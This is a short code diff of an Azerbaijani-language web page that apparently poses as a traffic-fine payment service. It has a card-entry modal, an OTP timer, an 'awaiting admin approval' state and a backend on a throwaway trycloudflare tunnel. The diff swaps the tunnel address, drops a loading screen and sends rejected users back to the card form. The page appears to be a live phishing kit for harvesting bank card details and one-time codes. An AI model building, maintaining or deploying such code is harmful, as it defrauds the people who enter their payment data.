@@ -188,7 +188,7 @@
     </div>
 
     <script>
-        let API_URL = 'https://continuously-pics-singing-robinson.trycloudflare.com/api';
+        let API_URL = 'https://developing-summer-trustee-inner.trycloudflare.com/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
@@ -241,25 +241,12 @@
             }
         }
 
-        function showLoadingScreen() {
-            document.getElementById('app-container').innerHTML = `
-                <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-12 text-center space-y-6">
-                    <div class="inline-block animate-spin rounded-full h-20 w-20 border-4 border-blue-600 border-t-transparent mx-auto"></div>
-                    <div class="space-y-2">
-                        <h1 class="text-2xl font-bold text-gray-800">Ödəniş Təsdiqlənir...</h1>
-                        <p class="text-sm text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı və admin təsdiqi yoxlanılır.</p>
-                    </div>
-                </div>
-            `;
-        }
-
         function updateUI(data) {
             let lastProtocol = localStorage.getItem('dyp_last_protocol');
             if (lastProtocol !== data.protocolNo) {
                 localStorage.setItem('dyp_last_protocol', data.protocolNo);
                 const newEndTime = Date.now() + 10 * 60 * 1000;
                 localStorage.setItem('dyp_timer_end', newEndTime);
-                localStorage.removeItem('dyp_waiting');
                 isWaitingForAdmin = false;
                 adviceShown = false;
             }
@@ -278,6 +265,7 @@
             }
 
             if (data.isPaid) {
+                localStorage.removeItem('dyp_waiting');
                 clearInterval(timerInterval);
 
                 document.getElementById('app-container').innerHTML = `
@@ -481,7 +469,7 @@
             isWaitingForAdmin = false;
             document.getElementById('reject-modal').classList.add('hidden');
 
-            await fetchFineData();
+            closeModals();
             openCardModal();
         }
 
